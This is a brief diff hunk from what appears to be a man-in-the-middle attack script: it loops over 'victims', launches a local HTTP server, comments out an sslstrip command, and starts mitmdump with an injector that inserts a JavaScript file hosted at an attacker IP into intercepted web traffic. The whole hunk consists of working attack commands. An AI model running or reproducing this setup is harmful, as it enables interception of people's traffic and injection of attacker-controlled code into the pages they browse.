@@ -46,7 +46,7 @@ for victim in victims:
 os.system("python3 httpServer.py &")
 
 # run sslstrip
-os.system("sslstrip -l 8080 &")
+#os.system("sslstrip -l 8080 &")
 
 # start the mitmproxy
 os.system("mitmdump -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T")
